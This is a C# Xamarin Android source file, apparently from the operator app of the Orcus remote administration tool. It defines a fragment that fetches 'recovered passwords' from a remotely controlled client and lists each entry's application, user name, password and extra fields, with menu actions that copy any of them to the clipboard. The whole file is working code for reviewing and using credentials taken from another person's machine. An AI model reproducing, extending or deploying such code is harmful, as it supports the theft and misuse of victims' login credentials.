
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Util;
using Android.Views;
using Android.Widget;
using System.Threading.Tasks;
using Orcus.Shared.Commands.Password;

namespace Orcus.Administration.App
{
	public class PasswordFragment : ListFragment
	{
		private PasswordCommand passwordCommand;
		private static List<RecoveredPassword> passwords = null;

		public override void OnDetach ()
		{
			base.OnDetach ();
			passwordCommand.PasswordsReceived -= PasswordCommand_PasswordsReceived;
		}

		public async override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your fragment here
			passwordCommand = ConnectionManager.Current.CurrentController.Commander.GetCommand<PasswordCommand>();
			passwordCommand.PasswordsReceived += PasswordCommand_PasswordsReceived;

			var adapter = new PasswordsListAdapter (Activity, passwords ?? new List<RecoveredPassword> ());
			ListAdapter = adapter;

			if (passwords == null) {
				PasswordCommand_PasswordsReceived (null, await Task.Run (() => ConnectionManager.Current.GetPasswords (ConnectionManager.Current.CurrentController.Client)));
			}
		}

		void PasswordCommand_PasswordsReceived (object sender, Orcus.Shared.Commands.Password.PasswordData e)
		{
			if (e != null)
				passwords = e.Passwords;
			else
				passwords = new List<RecoveredPassword> ();
			
			Activity?.RunOnUiThread (() => ((PasswordsListAdapter)ListAdapter).Change (passwords));
		}

		public override void OnActivityCreated (Bundle savedInstanceState)
		{
			base.OnActivityCreated (savedInstanceState);
			RegisterForContextMenu (ListView);
		}

		public override void OnCreateContextMenu (IContextMenu menu, View v, IContextMenuContextMenuInfo menuInfo)
		{
			base.OnCreateContextMenu (menu, v, menuInfo);

			Android.Widget.AdapterView.AdapterContextMenuInfo info = (Android.Widget.AdapterView.AdapterContextMenuInfo) menuInfo;
			var password = ((PasswordsListAdapter)ListAdapter).Passwords [info.Position];

			var inflater = Activity.MenuInflater;
			if (!string.IsNullOrEmpty (password.UserName))
				menu.Add (0, 0, 0, "Copy user name");
			if (!string.IsNullOrEmpty (password.Password))
				menu.Add (0, 1, 0, "Copy password");
			if (!string.IsNullOrEmpty (password.Field1))
				menu.Add (0, 2, 0, "Copy field 1");
			if (!string.IsNullOrEmpty (password.Field2))
				menu.Add (0, 3, 0, "Copy field 2");

			menu.SetHeaderTitle (password.Application);
		}

		public override bool OnContextItemSelected (IMenuItem item)
		{
			Android.Widget.AdapterView.AdapterContextMenuInfo info = (Android.Widget.AdapterView.AdapterContextMenuInfo) item.MenuInfo;

			var textToCopy = "";
			var toastMessage = "";
			var password = ((PasswordsListAdapter)ListAdapter).Passwords [info.Position];

			switch (item.ItemId) {
			case 0:
				textToCopy = password.UserName;
				toastMessage = "User name copied to clipboard";
				break;
			case 1:
				textToCopy = password.Password;
				toastMessage = "Password copied to clipboard";
				break;
			case 2:
				textToCopy = password.Field1;
				toastMessage = "Field 1 copied to clipboard";
				break;
			case 3:
				textToCopy = password.Field2;
				toastMessage = "Field 2 copied to clipboard";
				break;
			default:
				return base.OnContextItemSelected (item);
			}

			var clipboard = (ClipboardManager)Activity.GetSystemService (Activity.ClipboardService);
			clipboard.PrimaryClip = ClipData.NewPlainText ("password data", textToCopy);

			Toast.MakeText (Activity, toastMessage, ToastLength.Short).Show();
			return base.OnContextItemSelected (item);
		}
	}
}